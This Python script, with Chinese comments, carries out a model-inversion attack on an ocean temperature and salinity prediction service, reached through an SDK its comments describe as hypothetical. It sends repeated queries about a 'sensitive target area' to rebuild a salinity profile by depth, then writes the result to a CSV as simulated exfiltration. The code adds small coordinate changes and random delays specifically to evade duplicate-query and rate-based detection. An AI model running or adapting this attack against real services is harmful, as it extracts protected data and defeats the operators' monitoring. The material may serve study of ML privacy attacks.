# malicious_inversion_attack.py
import numpy as np
import time
import random

# 假设这是平台提供的模型客户端库
from platform_sdk.model_client import PredictiveModelClient

def main():
    # 初始化模型客户端
    client = PredictiveModelClient(model_name="ocean_ts_predictor_v1")

    # 目标敏感区域的中心坐标
    target_lat = 38.5
    target_lon = 122.0

    # 攻击参数
    depth_range = (0, 500)  # 深度范围 0-500米
    depth_step = 10         # 深度采样步长 10米（高分辨率）
    spatial_perturbation = 0.01  # 为了绕过简单的重复检测，在坐标上添加微小扰动
    num_queries_per_point = 5    # 对每个深度点查询多次，用于后续平均以降低模型随机性噪声

    results = []
    print(f"[+] Starting model inversion attack on target area ({target_lat}, {target_lon})")
    print(f"[+] Probing depth from {depth_range[0]}m to {depth_range[1]}m with step {depth_step}m")

    # 恶意查询的核心循环：遍历深度，并多次查询
    for current_depth in range(depth_range[0], depth_range[1] + depth_step, depth_step):  # (0,510,10)
        for i in range(num_queries_per_point):
            # 添加微小随机扰动到坐标上，使每次查询参数略有不同，规避简单重复检测
            perturbed_lat = target_lat + random.uniform(-spatial_perturbation, spatial_perturbation)
            perturbed_lon = target_lon + random.uniform(-spatial_perturbation, spatial_perturbation)

            # 构造查询输入
            input_features = [perturbed_lat, perturbed_lon, current_depth]  # 维度、经度、深度
            
            # 执行模型查询 - 这是攻击的核心动作
            try:
                prediction = client.predict(input_features)
                # prediction 可能是一个字典，例如 {'temperature': 15.6, 'salinity': 34.78}
                salinity_value = prediction['salinity']
                
                # 存储结果 (原始目标坐标，扰动后的坐标，深度，预测值)
                results.append({
                    'target_lat': target_lat,
                    'target_lon': target_lon,
                    'perturbed_lat': perturbed_lat,
                    'perturbed_lon': perturbed_lon,
                    'depth': current_depth,
                    'salinity': salinity_value
                })
                # 短暂延迟，规避基于请求速率的检测
                time.sleep(random.uniform(0.1, 0.3))  # 随机生成0.1到0.3之间的浮点数

            except Exception as e:
                print(f"[-] Error on query {i} at depth {current_depth}m: {e}")
                # 出错后稍作长时间停顿
                time.sleep(1)

        # 每完成一个深度，打印进度
        if current_depth % 50 == 0:
            print(f"[+] Progress: Completed depth {current_depth}m")

    # 所有查询完成，处理结果
    print(f"[+] Attack completed. Collected {len(results)} data points.")
    
    # 将结果按照深度聚合（例如取平均值）
    depth_salinity_map = {}
    for res in results:
        d = res['depth']  # 取出来每一个dict中key为'depth'对应的value
        if d not in depth_salinity_map:
            depth_salinity_map[d] = []
        depth_salinity_map[d].append(res['salinity'])  # {10:[33.456, 33.5012, 33.5546],20:[34.3465...],...}
    
    # 计算每个深度的平均盐度值
    reconstructed_profile = []
    # 按照key（深度）排序，确保输出的剖面是按深度顺序的
    for depth, salinities in sorted(depth_salinity_map.items()):  # sort是应用在list上的方法(对原列表直接操作)，sorted可以对所有可迭代的对象进行排序操作（返回一个新列表）。
        avg_salinity = sum(salinities) / len(salinities)
        reconstructed_profile.append((depth, avg_salinity))  # [(10,33.4586),(20,34.1235),...]
        print(f"  Depth: {depth:3d}m | Avg Salinity: {avg_salinity:.4f}")

    # 将重构的剖面数据保存到文件（模拟数据外传）
    output_filename = f"reconstructed_salinity_profile_{target_lat}_{target_lon}.csv"
    with open(output_filename, 'w') as f:
        f.write("Depth(m),Salinity(PSU)\n")
        for depth, salinity in reconstructed_profile:
            f.write(f"{depth},{salinity}\n")
    print(f"[+] Reconstructed salinity profile saved to {output_filename}")

if __name__ == "__main__":
    main()